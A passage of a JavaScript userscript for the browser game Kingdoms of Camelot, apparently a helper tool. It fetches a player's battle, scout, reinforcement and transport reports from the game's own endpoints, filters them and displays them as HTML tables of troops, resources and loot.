		document.getElementById("idRptSearched").innerHTML = '&nbsp;'+culang.Hsearched+': ' + reportsSearched;
		document.getElementById("idRptFound").innerHTML = ''+culang.Hfound+': ' + reportsFound;
	},
	
	
	getMailBody: function(ID,dataI){
		var t = Tabs.Reports;
		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
		params.messageId=ID;
		params.requestType="GET_MESSAGE_FOR_ID";

		new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/getEmail.php" + unsafeWindow.g_ajaxsuffix, {
			method: "post",
			parameters: params,
			onSuccess: function (rslt) {
				if (rslt.ok)
					t.displayMailBody(rslt.messageBody, ID);
			},
			onFailure: function () {},
		}, false);
	},

	displayMailBody: function (messageBody, ID) {
		var t = Tabs.Reports;
		if (t.popMsg == null) {
		  t.popMsg = new CPopup('pbMailBody', 0, 0, 746, 100, true, function() {clearTimeout (1000);});
		  t.popMsg.centerMe (mainPop.getMainDiv());
		}
		messageBody=messageBody.replace(/custom-line-break/g,"<br>");
		var m = '<DIV style="max-height:750px; overflow:auto"><br><hr>';
		m+= messageBody + '<hr><a onclick="DelMail('+ ID +');"><img src="http://cdn1.iconfinder.com/data/icons/musthave/16/Remove.png" border=0 title="'+culang.deleteb+'"> '+culang.deleteb+'</a><br></div>'; 
		t.popMsg.getMainDiv().innerHTML = m;
		t.popMsg.getTopDiv().innerHTML = '<DIV class=showBadged><center>'+culang.message+'</center></DIV>';
		t.popMsg.show(true);
	},

	DisplayRpt: function (){
		var t = Tabs.Reports;
		var results = document.getElementById("ReportResultDiv");
		if(!t.data.length) {
			results.innerHTML = '<center>'+culang.noHits+'</center>';
			return;
		}
		var myAllianceId = parseInt(getMyAlliance()[0]);
		reportsSearched = t.data.length;
		reportsFound = 0;
		t.content = '';
		for (var i=0; i<reportsSearched;i++) {
			var reportId = t.data[i].reportId;
			var rpt = t.report[reportId];
			if ((rpt.side0Name=='undefined') && (rpt.marchName != ''+culang.desert+''))
				continue;
			if ((((myAllianceId == parseInt(rpt.side1AllianceId) && Options.arAttacker != 'Them')
				|| (myAllianceId != parseInt(rpt.side1AllianceId) && Options.arAttacker != 'Us')
				|| Options.arAttacker == 'Both')
				&& ((myAllianceId == parseInt(rpt.side0AllianceId) && Options.arTarget != 'Them')
				|| (myAllianceId != parseInt(rpt.side0AllianceId) && Options.arTarget != 'Us')
				|| Options.arTarget == 'Both')
				&& ((Options.arAttack && (rpt.marchName == ''+culang.rptattack+'' || rpt.marchName == ''+culang.defense+''))
				|| (Options.arScout && (rpt.marchName == ''+culang.ascout+'' || rpt.marchName == ''+culang.scout+''))
				|| (Options.arReinforce && rpt.marchName == ''+culang.rptreinforce+'')
				|| (Options.arTransport && rpt.marchName == ''+culang.transport+'')))
				|| (rpt.marchName == ''+culang.desert+'')) {
				if (((t.what == ''
					|| (rpt.side1Name.search(t.what, "i") != -1)
					|| (rpt.side1AllianceName.search(t.what, "i") != -1)
					|| (rpt.side0Name.search(t.what, "i") != -1)
					|| (rpt.side0AllianceName.search(t.what, "i") != -1)
					|| (rpt.side0TileTypeText.search(t.what, "i") != -1))
					&& (t.whatNot == ''
					|| ((rpt.side1Name.search(t.whatNot, "i") == -1)
					&& (rpt.side1AllianceName.search(t.whatNot, "i") == -1)
					&& (rpt.side0Name.search(t.whatNot, "i") == -1)
					&& (rpt.side0AllianceName.search(t.whatNot, "i") == -1)
					&& (rpt.side0TileTypeText.search(t.whatNot, "i") == -1))))
					|| (rpt.marchName == ''+culang.desert+'')) {
					
					if ((document.getElementById("idRptFiltre1").value=="") ||   (rpt.side0TileType==54 && document.getElementById("idRptFiltre1").value==54)  ||
					    (rpt.side0TileType>0 && rpt.side0TileType<51 && document.getElementById("idRptFiltre1").value==0)) {
				
					reportsFound++;
					if (reportsFound == 1) {
						t.content += '<center><table class=pdxTabOverview width=100% cellspacing=0 cellpadding=3><thead><th>'+culang.shrp+'</th><th>'+culang.shraction+'</th><th>'+culang.udate+'</th><th>'+culang.attacker+'</th><th>'+culang.coord+'</th>';
						if (Options.arAttacker != 'Us')
							t.content += '<th>'+culang.alliance+'</th>';
						t.content += '<th>'+culang.action+'</th><th>'+culang.target+'</th><th>'+culang.coord+'</th>';
						if (Options.arTarget != 'Us')
							t.content += '<th>'+culang.alliance+'</th>';
						t.content += '<th>'+culang.type+'</th><th><span title="'+culang.ynextCity+'">'+culang.shrrp+'</span></th><th><span title="'+culang.nextCityNote+'">'+culang.shrd+'</span></th></thead><tbody>';
					}
					var closestDist=999999;
					var closestLoc=null;
					var closestNum=1;
					for (var c=0; c<Cities.numCities; c++){
						var city = Cities.cities[c];
						var dist=distance(city.x,city.y,rpt.side0XCoord,rpt.side0YCoord);
						if(dist<closestDist) {
							closestDist=dist;
							closestLoc=city.x +','+ city.y;
							closestNum=c+1;
						}
					}
					if (rpt.marchName == ''+culang.ascout+'' || rpt.marchName == ''+culang.defense+'')
					 style=' style="background-color:#EF9999;"';
					else if (rpt.marchName == ''+culang.rptreinforce+'')
					 style=' style="background-color:#99EF99;"';
					else
					 style="";
					t.content += '<tr id="pdxRpt'+ reportId +'"><td align=right '+style+'>'+rpt.page+'</td><td  align=right '+style+'><a onclick="getReport('+ reportId+')" title="'+culang.show+'"><img  border=0 src="http://cdn1.iconfinder.com/data/icons/woothemesiconset/16/search_button.png"></a>';
					 if (rpt.side0Name==Seed.player.name || rpt.side1Name==Seed.player.name) {
					         t.content +='&nbsp;<a onclick="DelReport('+ reportId +', false);document.getElementById(\'pdxRpt'+ reportId +'\').style.display=\'none\';"><img src="http://cdn1.iconfinder.com/data/icons/musthave/16/Remove.png" border=0 title="'+culang.delrep+'"></a>';
        					}
					t.content += '</td><td '+style+'>'+formatUnixTime(rpt.reportUnixTime,'24hour')+'</td>';
					if (rpt.marchName == ''+culang.desert+'') {
						t.content += '<td '+style+'></td><td '+style+'></td>';
						if (Options.arAttacker != 'Us')
							t.content += '<td '+style+'></td>';
						t.content += '<td '+style+'>'+rpt.marchName+'</td><td '+style+'></td><td '+style+'></td><td '+style+'></td>';
						if (Options.arAttacker != 'Us')
							t.content += '<td '+style+'></td>';
						t.content += '<td '+style+'></td><td '+style+'></td>';
						} else {
						t.content += '<td '+style+'><span title="'+rpt.side1Name+'">'+rpt.side1Name.substring(0,12)+'</span></td><td align=center '+style+'>'+pdxkoordlink(rpt.side1XCoord,rpt.side1YCoord)+'</td>';
						if (Options.arAttacker != 'Us')
						t.content += '<td '+style+'><span title="'+rpt.side1AllianceName+'">'+rpt.side1AllianceName.substring(0,17)+'</span></td>';
						            if (rpt.marchName == ''+culang.ascout+'' || rpt.marchName == ''+culang.scout+'')
						             t.content += '<TD '+style+'><FONT color="FF8822">'+rpt.marchName+'</font></td>';
							    else if (rpt.marchName == ''+culang.rptattack+'' || rpt.marchName == ''+culang.defense+'')
							     t.content += '<TD '+style+'><FONT color="FF1122">'+rpt.marchName+'</font></td>';
							    else if (rpt.marchName == ''+culang.rptreinforce+'')
	      					 	     t.content += '<TD '+style+'><FONT color="339933">'+rpt.marchName+'</font></td>';
	      					 	    else
	      					 	     t.content += '<TD '+style+'>'+rpt.marchName+'</td>';
						//t.content += '<td>'+rpt.marchName+'</td>';
						t.content += '<td '+style+'><span title="'+rpt.side0Name+'">'+rpt.side0Name.substring(0,12)+'</span></td>';
						t.content += '<td align=center '+style+'>'+pdxkoordlink(rpt.side0XCoord,rpt.side0YCoord)+'</td>';
						if (Options.arTarget != 'Us')
							t.content += '<td '+style+'><span title="'+rpt.side0AllianceName+'">'+rpt.side0AllianceName.substring(0,17)+'</span></td>';
						t.content += '<td '+style+'>'+rpt.side0TileTypeLevel+'</td><td align=center '+style+'><A onclick=\"citysel_click(document.getElementById(\'citysel_'+ (closestNum)+'\'));\">' + closestLoc + '</a></td><td align=right '+style+'>'+Math.floor(closestDist)+'</td></tr>';
					}
				}	
				}
			}
		}
		if (reportsFound > 1)
			t.content += '</tbody></table></center>';
		if (reportsFound == 0 && reportsSearched > 0)
			t.content = '<center>'+culang.noHits+'</center>';
		results.innerHTML = t.content;
		document.getElementById("idRptSearched").innerHTML = '&nbsp;'+culang.Hsearched+': ' + reportsSearched;
		document.getElementById("idRptFound").innerHTML = ''+culang.Hfound+': ' + reportsFound;
	},

	getReportBody: function(reportId){
		var t = Tabs.Reports;
		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
		params.rid=reportId;
		params.side=t.report[reportId].sideId;
		if (params.side > -1) {
			new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/fetchReport.php" + unsafeWindow.g_ajaxsuffix, {
				method: "post",
				parameters: params,
				onSuccess: function (rslt) {
					t.displayReportBody(rslt,reportId);
				},
				onFailure: function (rslt) {},
			}, false);
		} else {
			
		}
	},

		
			
	
	
	
	displayReportBody: function (rslt, reportId) {
		var t = Tabs.Reports;
		var popReport = null;
		var rpt = t.report[reportId];
		var m = '';
		var fortmight = {u53: "4",u55: "7",u60: "1",u61: "2",u62: "3",    };
		var unitImg = [];
		var puipui=new Array();
		for (var ui = 1 ; ui<13; ui++)
		 puipui.push(unsafeWindow.unitmight['unt'+ui]);
		puipui[53] = fortmight['u53'];
		puipui[55] = fortmight['u55'];
		puipui[60] = fortmight['u60'];
		puipui[61] = fortmight['u61'];
		puipui[62] = fortmight['u62'];
		ordre_grandeur=0;
		delta_perte=0;
		var perte_atk = 0;
		var perte_def = 0;
		for (var i=1;i<13;i++)
			unitImg[i] = '<img height=20 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_'+i+'_30_s34.jpg title="'+unsafeWindow.unitcost['unt'+i][0]+'"></TD><TD>' + unsafeWindow.unitcost['unt'+i][0].substr(0,10);
		for (var i=101;i<111;i++)
			unitImg[i] = '<img height=20 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_'+i+'_30.jpg title="'+unsafeWindow.g_js_strings.monsterUnitsNames['m'+i]+'"></TD><TD>' + unsafeWindow.g_js_strings.monsterUnitsNames['m'+i].substr(0,10);
	        unitImg[53] = '<img height=20 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_53_30.png></TD><TD>'+culang.crossbows+'';
		unitImg[55] = '<img height=20 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_55_30.png></TD><TD>'+culang.trebuchet+'';
		unitImg[60] = '<img height=20 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_60_30.png></TD><TD>'+culang.trap+'';
		unitImg[61] = '<img height=20 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_61_30.png></TD><TD>'+culang.caltr+'';
		unitImg[62] = '<img height=20 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_62_30.png></TD><TD>'+culang.spiked+'';
		goldImg = '<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/gold_30.png></TD><TD>'+culang.gold+'';
		foodImg = '<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/food_30.png></TD><TD>' + unsafeWindow.g_js_strings.commonstr.food;
		woodImg = '<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/wood_30.png></TD><TD>'+culang.wood+'';
		stoneImg = '<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/stone_30.png></TD><TD>'+culang.stone+'';
		oreImg = '<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/iron_30.png></TD><TD>'+culang.ore+'';
		aetherstoneImg = '<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/aetherstone_30.png></TD><TD>'+culang.astone+'';
		
		function buildHeader () {
			var h='<TABLE class=pdxTab width=100%>';
			h+='<TR valign=top><TD align=left width=10%><B>';
			if (rpt.marchName == ''+culang.ascout+'' || rpt.marchName == ''+culang.scout+'')
				h+=""+culang.marchType+" " + rpt.marchName+' ';
			else if (rpt.marchName == ''+culang.rptattack+'' || rpt.marchName == ''+culang.defense+'')
				h+='<b>'+culang.fightat+'</b> ';
			else if (rpt.marchName == ''+culang.rptreinforce+'' || rpt.marchName == ''+culang.transport+'')
				h+=rpt.marchName+' '+culang.from+'<BR />'+rpt.marchName+' '+culang.to+'</B>';

			if (rpt.side0TileTypeText == ''+culang.rptbarb+'')
				h+=' '+culang.barbarians+' '+culang.level+'' + rpt.side0TileLevel;
			else if (rpt.side0TileTypeText != ''+culang.city+'')
				h+=' '+rpt.side0TileTypeText+' '+culang.level+' '+ rpt.side0TileLevel+' ';
			h+='</B></TD>';

			if (rpt.marchName == ''+culang.rptreinforce+'' || rpt.marchName == ''+culang.transport+'') {
				h+='<TD align=left width=1%>';
				if (Seed.player.name != rpt.side1Name)
					h+=rpt.side1Name;
				if (Seed.player.name != rpt.side0Name)
					h+='<BR />'+rpt.side0Name;
				h+='</TD>';
			}
			h+='<TD align=left width=5%>';

			if (rpt.marchName == ''+culang.rptreinforce+'' || rpt.marchName == ''+culang.transport+'')
				h+=''+pdxkoordlink(rpt.side1XCoord,rpt.side1YCoord)+'<BR />';
			h+=''+pdxkoordlink(rpt.side0XCoord,rpt.side0YCoord)+'</TD>';

			if (rpt.side0TileTypeText != ''+culang.city+'' && rpt.side0TileTypeText != ''+culang.rptbarb+'' && (rpt.marchName == ''+culang.rptattack+'' || rpt.marchName == ''+culang.defense+'')) {
				if (rslt['conquered']==1)
					h+='<TD><FONT color="#CC0000"><B>'+culang.conquered+'</B></font></td>';
				else if (rslt['conquered']==0)
					h+='<TD><FONT color="#66CC33"><B>'+culang.secured+'</B></font></td>';
			} else if (rpt.marchName == ''+culang.rptreinforce+'' || rpt.marchName == ''+culang.transport+'') {
				h+='<TD align=left width=5%>'+rpt.side1CityName+'<BR />';
				if (rpt.side0CityName != '')
					h+=rpt.side0CityName+'</TD>';
				else
					h+=rpt.side0TileTypeText+' '+culang.level+' '+ rpt.side0TileLevel+'</TD>';
			}

			h+='<TD align=right>' + formatUnixTime(rpt.reportUnixTime,'24hour') + '<BR />&nbsp;';
			if (rpt.side0Name==Seed.player.name || rpt.side1Name==Seed.player.name)
			  h+='<a onclick="DelReport('+ reportId +', false);document.getElementById(\'pdxRpt'+ reportId +'\').style.display=\'none\';document.getElementById(\'pbShowOther_X\').click();"><img src="http://cdn1.iconfinder.com/data/icons/musthave/16/Remove.png" border=0 title="'+culang.deleteb+'"></a>';
			
			h+='&nbsp;'+culang.shrreport+': ' + reportId + '</TD></TR></TABLE>';
			return h;
		}

		function handleunts () { // Troops sent to Reinforce or troops found on a Scout
			var hunts = '', th = '', tc = '', tf = '';
			if (rslt['unts'] != undefined) {
				if (rpt.marchName == ''+culang.rptreinforce+'')
					th='<TABLE class=pdxTab><TR><TH colspan=3 align=left>'+culang.sendReinforce+'</TH></TR>';
				else if (rslt['unts']['u1'] != undefined || rslt['unts']['u2'] != undefined || rslt['unts']['u3'] != undefined || rslt['unts']['u4'] != undefined || rslt['unts']['u5'] != undefined || rslt['unts']['u6'] != undefined || rslt['unts']['u7'] != undefined || rslt['unts']['u8'] != undefined || rslt['unts']['u9'] != undefined || rslt['unts']['u10'] != undefined || rslt['unts']['u11'] != undefined || rslt['unts']['u12'] != undefined)
					th='<TABLE class=pdxTab><TR><TH colspan=3 align=left>'+culang.units+'</TH></TR>';
				for (var i=1;i<13;i++)
					if (rslt['unts']['u'+i] != undefined)
						tc+='<TR><TD>' + unitImg[i] + '</TD><TD align=right>'+addCommas(rslt['unts']['u'+i])+'</TD></TR>';
				
				tf='</TABLE>';
			}
			if (tc != '')
				hunts = th + tc + tf;
			return hunts;
		}

		function handlersc () { // Resources brought with reinforcements or found on a Scout
			var hrsc = '', th = '', tc = '', tf = '';
			if (rslt['rsc'] != undefined) {
				if (rslt['rsc']['r1'] > 0 || rslt['rsc']['r2'] > 0 || rslt['rsc']['r3'] > 0 || rslt['rsc']['r4'] > 0) {
					if (rpt.marchName == ''+culang.rptreinforce+'')
						th='<TABLE class=pdxTab><TR><TH colspan=3 align=left>'+culang.goodies+'</TH></TR>';
					else {
						th='<TABLE class=pdxTab><TR><TH colspan=3 align=left>'+culang.res+'</TH></TR>';
						if (rslt['gld'] > 0)
							tc+='<TR><TD>'+goldImg+'</TD><TD align=right>'+addCommasInt(rslt['gld'])+'</TD></TR>';
					}
					if (rslt['rsc']['r1'] > 0)
						tc+='<TR><TD>'+foodImg+'</TD><TD align=right>'+addCommasInt(rslt['rsc']['r1'])+'</TD></TR>';
					if (rslt['rsc']['r2'] > 0)
						tc+='<TR><TD>'+woodImg+'</TD><TD align=right>'+addCommasInt(rslt['rsc']['r2'])+'</TD></TR>';
					if (rslt['rsc']['r3'] > 0)
						tc+='<TR><TD>'+stoneImg+'</TD><TD align=right>'+addCommasInt(rslt['rsc']['r3'])+'</TD></TR>';
					if (rslt['rsc']['r4'] > 0)
						tc+='<TR><TD>'+oreImg+'</TD><TD align=right>'+addCommasInt(rslt['rsc']['r4'])+'</TD></TR>';
					tf='</TABLE>';
				}
			}
			if (tc != '')
				hrsc = th + tc + tf;
			return hrsc;
		}

		function handlefrt () { // Fortifications found on a Scout
			var hfrt = '', th = '', tc = '', tf = '';
			if (rslt['frt'] != undefined) {
				if (rslt['frt']['f53'] != undefined || rslt['frt']['f55'] != undefined || rslt['frt']['f60'] != undefined || rslt['frt']['f61'] != undefined || rslt['frt']['f62'] != undefined) {
					th='<TABLE class=pdxTab><TR><TH colspan=3 align=left>'+culang.defense+'</TH></TR>';
					if (rslt['frt']['f53'] != undefined)
						tc+='<TR><TD>' + unitImg[53] + '</TD><TD align=right>'+addCommas(rslt['frt']['f53'])+'</TD></TR>';
					if (rslt['frt']['f55'] != undefined)
						tc+='<TR><TD>' + unitImg[55] + '</TD><TD align=right>'+addCommas(rslt['frt']['f55'])+'</TD></TR>';
					if (rslt['frt']['f60'] != undefined)
						tc+='<TR><TD>' + unitImg[60] + '</TD><TD align=right>'+addCommas(rslt['frt']['f60'])+'</TD></TR>';
					if (rslt['frt']['f61'] != undefined)
						tc+='<TR><TD>' + unitImg[61] + '</TD><TD align=right>'+addCommas(rslt['frt']['f61'])+'</TD></TR>';
					if (rslt['frt']['f62'] != undefined)
						tc+='<TR><TD>' + unitImg[62] + '</TD><TD align=right>'+addCommas(rslt['frt']['f62'])+'</TD></TR>';
					tf='</TABLE>';
				}
			}
			if (tc != '')
				hfrt = th + tc + tf;
			return hfrt;
		}

		function handleblds (bType) {
		     if (rslt['blds'] != undefined) {
		
			var blds = rslt['blds']['b'+bType]; 
			var couleur='';
			if (bType==8) couleur=' style="background-color:red"';
			b = '<TR><TD '+couleur+'>'; arField = [], firstbld = true;
			b+=unsafeWindow.buildingcost["bdg"+bType][0]+'</TD><TD '+couleur+'>';
			for (var i=1; i<12; i++)
				arField[i]=0;
			for (var i=0; i < blds.length; i++)
				arField[blds[i]]++
			for (var i=11; i>0; i--) {
				if (arField[i] > 0) {
					if (firstbld)
						firstbld = false;
					else
						b+=', ';
					if (arField[i] > 1)
						b+=arField[i] + ' x ';
					b+=' ' + i;
				}
			}
			b+='</TD></TR>';
		       } else {
		        b='';
		       }
		       return b;
		}

    	if (t.popReport == null) {
 		if (rpt.marchName == ''+culang.rptreinforce+'') {
			t.popReport = new CPopup('pbShowRein', 0, 0, 746, 100, true, function() {clearTimeout (1000);});
			m+= '<DIV style="height:385px">';
		} else if (rpt.marchName == ''+culang.transport+'') {
			t.popReport = new CPopup('pbShowTrans', 0, 0, 746, 100, true, function() {clearTimeout (1000);});
			m+= '<DIV style="height:285px">';
		} else if (rpt.marchName == ''+culang.scout+'' && rslt['winner']==1 && rpt.sideId==1){
			t.popReport = new CPopup('pbShowOther', 0, 0, 746, 100, true, function() {clearTimeout (1000);});
			m+= '<DIV style="max-height:685px; height:485px; overflow-y:scroll">';
		} else {
			t.popReport = new CPopup('pbShowOther', 0, 0, 746, 100, true, function() {clearTimeout (1000);});
			m+= '<DIV style="max-height:623px; height:423px; overflow-y:scroll">';
		}
		t.popReport.centerMe (mainPop.getMainDiv());
	        t.popReport.autoHeight (true); 
	      }
		m+=buildHeader();

		if (rpt.marchName == ''+culang.transport+'') { // Transport
			m+='<TABLE class=pdxTab>'; // Only transports have these in rslt, so handle them here
			if (parseInt(rslt['gold']) > 0)
				m+='<TR><TD>'+goldImg+'</TD><TD align=right>'+addCommas(rslt['gold'])+'</TD></TR>';
			if (parseInt(rslt['resource1']) > 0)
				m+='<TR><TD>'+foodImg+'</TD><TD align=right>'+addCommas(rslt['resource1'])+'</TD></TR>';
			if (parseInt(rslt['resource2']) > 0)
				m+='<TR><TD>'+woodImg+'</TD><TD align=right>'+addCommas(rslt['resource2'])+'</TD></TR>';
			if (parseInt(rslt['resource3']) > 0)
				m+='<TR><TD>'+stoneImg+'</TD><TD align=right>'+addCommas(rslt['resource3'])+'</TD></TR>';
			if (parseInt(rslt['resource4']) > 0)
				m+='<TR><TD>'+oreImg+'</TD><TD align=right>'+addCommas(rslt['resource4'])+'</TD></TR>';
			m+='</TABLE>';
		}

		m+='<TABLE class=pdxTab>';
		if ((rslt['winner']==1 && rpt.sideId==0) || (rslt['winner']==0 && rpt.sideId==1)) {
			if (rpt.marchName == ''+culang.scout+'')
				m+='<TR><TD><FONT color="#CC0000"><B>'+culang.rptscoutmiss+'</B></font></TD></TR>';
			else
				m+='<TR><TD><FONT color="#CC0000"><B>'+culang.rptulose+'</B></font></TD></TR>';
		}
		if (rslt['winner']==0 && rpt.sideId==0)
			m+='<TR><TD><FONT color="#66CC33"><B>'+culang.rptudefend+'</B></font></TD></TR>';
		if (rslt['winner']==1 && rpt.sideId==1) {
			if (rpt.marchName == ''+culang.scout+'')
				m+='<TR><TD><FONT color="#66CC33"><B>'+culang.scout+' '+culang.shrreport+'</B></font></TD></TR>';
			else
				m+='<TR><TD><FONT color="#66CC33"><B>'+culang.rptuwin+'</B></font></TD></TR>';
		}

		if (rslt['wall'] != undefined) {
			if (rslt['wall'] == 100)
				m+='<TR><TD>'+culang.rptattacker+'</TD></TR>';
			else if (rslt['wall'] != 0)
				m+='<TR><TD>'+culang.rptwalldont+': '+rslt['wall']+'%</TD></TR>';
		}
		m+= '</TABLE><BR />';

		if (rslt['loot'] != undefined) {
			m+='<TABLE class=pdxTab>';
			if (rslt['loot'][0] > 0)
				m+='<TR><TD>'+goldImg+'</TD><TD align=right>'+addCommas(rslt['loot'][0])+'</TD></TR>';
			if (rslt['loot'][1] > 0)
				m+='<TR><TD>'+foodImg+'</TD><TD align=right>'+addCommas(rslt['loot'][1])+'</TD></TR>';
			if (rslt['loot'][2] > 0)
				m+='<TR><TD>'+woodImg+'</TD><TD align=right>'+addCommas(rslt['loot'][2])+'</TD></TR>';
			if (rslt['loot'][3] > 0)
				m+='<TR><TD>'+stoneImg+'</TD><TD align=right>'+addCommas(rslt['loot'][3])+'</TD></TR>';
			if (rslt['loot'][4] > 0)
				m+='<TR><TD>'+oreImg+'</TD><TD align=right>'+addCommas(rslt['loot'][4])+'</TD></TR>';
			if (rslt['loot'][6] > 0)
				m+='<TR><TD>'+aetherstoneImg+'</TD><TD align=right>'+addCommas(rslt['loot'][6])+'</TD></TR>';
			if (rslt['loot'][5] !== undefined) {
				var q=unsafeWindow.Object.keys(rslt['loot'][5]);
				if (q.length>0) {
				 for(var u=0,y=q.length;u<y;++u){
				 C=q[u];
				 if (unsafeWindow.ksoItems[C]!==undefined) 
				  m+="<TR><td><img width=30 src=https://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/" + C + ".jpg></td><td colspan=2>"+unsafeWindow.ksoItems[C].name+"</td></tr>";
			        }
			        }
				
			}
			m+='</TABLE><BR />';
		}

		if (rpt.marchName == ''+culang.rptreinforce+'') {
			m+=handleunts();
			m+=handlersc();
		}

		if (rpt.marchName == ''+culang.scout+'' && rslt['winner']==1) {
			m+='<TABLE class=pdxTab width=100%><TR><TD width=50% align=left valign=top>';
			m+=handleunts();
			if (rpt.side0TileTypeText!=''+culang.darkforest+'')  m+=handlefrt();			
			 m+=handlersc();
			m+='</TD><TD width=50% align=left valign=top>';
			if (rpt.side0TileTypeText!=''+culang.darkforest+'') {
			m+='<TABLE class=pdxTab width=100%>';
			if (rslt['lstlgn'] != undefined) {
				if (!rslt['lstlgn'])
					m+='<TR><TD>'+culang.lastlogin2+': -</TD></TR>';
				else
					m+='<TR><TD>'+culang.lastlogin2+': ' + formatUnixTime(rslt['lstlgn']) + '</TD></TR>';
			}
			m+='<TR><TD>'+culang.marschall+': ';
			if (rslt['knt'] != undefined)
				m+=rslt['knt']['cbt'];
			else
				m+=''+culang.none+'';
			m+='</TD></TR>';
			
			if (rslt['pop'] != undefined)
				m+='<TR><TD>'+culang.pop+': ' + addCommas(rslt['pop']) + '</TD></TR>';
			if (rslt['hap'] != undefined)
				m+='<TR><TD>'+culang.luck+': ' + addCommas(rslt['hap']) + '</TD></TR></TABLE>';
			
			 if (rslt['blds'] != undefined) {
				m+='<TABLE class=pdxTab><TR><TH colspan=2 align=left>'+culang.fields+'</TH></TR>';
				for (var i=0; i<53; i++)
					if (rslt['blds']['b'+i] != undefined)
						m+=handleblds(i);
				m+='</TABLE>';
			 }
			 if (rslt['tch'] != undefined) {
				m+='<TABLE class=pdxTab><TR><TH colspan=2 align=left>'+culang.research+'</TH></TR>';
				for (var tl=1; tl < 17; tl++)
					if (tl != 7)
						m+='</TD></TR><TR><TD>'+researchLevels[tl].Name+'</TD><TD align=right>' + rslt['tch']['t'+tl] + '</TD></TR>';
				m+='</TABLE>';
			 }
			}
			m+='</TD></TR></TABLE>';
		}

		if (rslt['fght'] != undefined){ // not Reinforce or Transport, so we have a table with 2 columns: 1 for Attackers, 1 for Defenders
			m+='<TABLE class=pdxTab width=100%><TR><TD width=50% align=left valign=top>';
			m+='<TABLE class=pdxTab width=100%>';
			m+='<TR><TD colspan=4><B>'+culang.attacker+'</B> ('+rpt.side1Name+')';
			if (rslt['winner']==1)
				m+='<FONT color="#CC0000"><B>'+culang.winner+'</B></FONT>';
			m+='</TD></TR>';
			if (rpt.marchName == ''+culang.rptattack+'' || rpt.marchName == ''+culang.defense+'')
				m+='<TR><TD colspan=4>'+culang.knights+': ' + rslt['s1KCombatLv'].replace('Higher','Plus &eacute;lev&eacute;') + '</TD></TR>';
			if (rslt['s1atkBoost']!== undefined)
			 m+='<TR><TD colspan=4>'+culang.rptattack+' ('+culang.boosted+'): ' + 100*rslt['s1atkBoost'] + '%</TD></TR>';
			if (rslt['s1defBoost']!== undefined)
			 m+='<TR><TD colspan=4>'+culang.def+' ('+culang.boosted+'): ' + 100*rslt['s1defBoost'] + '%</TD></TR>';
			if (rslt['s1lifeBoost']!== undefined)
			 m+='<TR><TD colspan=4>'+culang.lifePoints+': ' + 100*rslt['s1lifeBoost'] + '%</TD></TR>';
			if (rslt['s1guardianDefBoost']!== undefined)
			 m+='<TR><TD colspan=4>'+culang.guardians+' ('+culang.def+' '+culang.boosted+'): ' + 100*rslt['s1guardianDefBoost'] + '%</TD></TR>';
			if (rslt['s1guardianAtkBoost']!== undefined)
			 m+='<TR><TD colspan=4>'+culang.guardians+' ('+culang.rptattack+' '+culang.boosted+'): ' + 100*rslt['s1guardianAtkBoost'] + '%</TD></TR>';
			 m+='<TR><TD colspan=4>(<A onclick="pdxGotoMap('+ rpt.side1XCoord +','+ rpt.side1YCoord +')">'+ rpt.side1XCoord +','+ rpt.side1YCoord +'</a>) ' + rpt.side1CityName + '</TD></TR>';
			if (rslt['fght']["s1"] != undefined) {
				m+='<TR><TH></TH><TH align=left>'+culang.troops+'</TH><TH align=right>'+culang.fighted+'</TH><TH align=right>'+culang.comeback+'</TH><TH align=right>'+culang.rptKilled+'</TH></TR>';
				for (var i=1;i<13;i++) {
					if (rslt['fght']["s1"]['u'+i] != undefined) {
						if (rslt['fght']["s1"]['u'+i][0] > rslt['fght']["s1"]['u'+i][1]) {
							perte_atk= perte_atk +(rslt['fght']["s1"]['u'+i][0] - rslt['fght']["s1"]['u'+i][1])*puipui[i-1];
							m+='<TR><TD>' + unitImg[i] + '</td>';
							m+='<TD align=right>'+addCommas(rslt['fght']["s1"]['u'+i][0])+'</td>';
							m+='<TD align=right><FONT color="#CC0000">'+addCommas(rslt['fght']["s1"]['u'+i][1])+'</FONT></td>';
							m+='<TD align=right><FONT color="#CC0000">'+addCommas(rslt['fght']["s1"]['u'+i][0] - rslt['fght']["s1"]['u'+i][1])+'</FONT></td></tr>';
						} else {
							m+='<TR><TD>' + unitImg[i] + '</td>';
							m+='<TD align=right>'+addCommas(rslt['fght']["s1"]['u'+i][0])+'</td>';
							m+='<TD align=right>'+addCommas(rslt['fght']["s1"]['u'+i][1])+'</td></tr>';
						}
					}
				}
			}
			m+='</TABLE></TD><TD width=50% align=right valign=top>';
			m+='<TABLE class=pdxTab width=100%>';
			m+='<TR><TD colspan=4><B>'+culang.defender+'</B> ('+rpt.side0Name+')';
			if (rslt['winner']==0)
				m+='<FONT color="#CC0000"><B>'+culang.winner+'</B></FONT>';
			m+='</TD></TR>';
			if (rpt.marchName == ''+culang.rptattack+'' || rpt.marchName == ''+culang.defense+'')
				m+='<TR><TD colspan=4>'+culang.knights+': ' + rslt['s0KCombatLv'] + '</TD></TR>';
			if (rslt['s0atkBoost'] !== undefined)
				m+='<TR><TD colspan=4>'+culang.rptattack+' ('+culang.boosted+'): ' + 100*rslt['s0atkBoost'] + '%</TD></TR>';
			else
				m+='<TR><TD colspan=4>&nbsp;</TD></TR>';
			if (rslt['s0defBoost'] !== undefined)
				m+='<TR><TD colspan=4>'+culang.def+' ('+culang.boosted+'): ' + rslt['s0defBoost'] + '%</TD></TR>';
			else
				m+='<TR><TD colspan=4>&nbsp;</TD></TR>';
